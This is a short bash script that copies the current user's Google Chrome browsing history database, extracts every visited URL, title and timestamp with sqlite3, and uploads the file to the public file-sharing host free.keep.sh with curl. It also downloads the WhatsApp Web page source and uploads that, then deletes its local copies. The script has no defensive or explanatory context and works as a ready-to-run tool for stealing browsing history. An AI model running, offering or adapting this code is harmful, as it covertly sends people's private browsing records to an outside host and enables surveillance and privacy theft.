#!/bin/bash


HOME_="/home/$USER/Documents/"

#BrowsingHistory & Whatsapp
function GetChromeHistoryNWhatsapp(){
    output_file="chrome_history.txt"
    tmp_chrome_history="$HOME_/tmp_chrome_history.sqlite"
    # 
    chrome_history_file="/home/$USER/.config/google-chrome/Default/History"
    # 
    cp "$chrome_history_file" $tmp_chrome_history
    #
    sqlite3 -separator $'\t' $tmp_chrome_history "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), title, url FROM urls ORDER BY last_visit_time DESC;" > $HOME_$output_file
    #Upload History
    Upload "$output_file"
    rm $tmp_chrome_history
    rm -f "$HOME_$output_file"
    
    #Whatsapp View Source & Upload
    `curl -s https://web.whatsapp.com/ > WhatsappSource.txt`
    Upload "WhatsappSource.txt"
    rm WhatsappSource.txt
    #
    sleep 5
}

function Upload(){
	echo "Debug: $HOME_$1";
    Respx=`curl -k --upload-file $HOME_$1 https://free.keep.sh`
    echo "Responce: $Respx";
}

#RunCode
GetChromeHistoryNWhatsapp



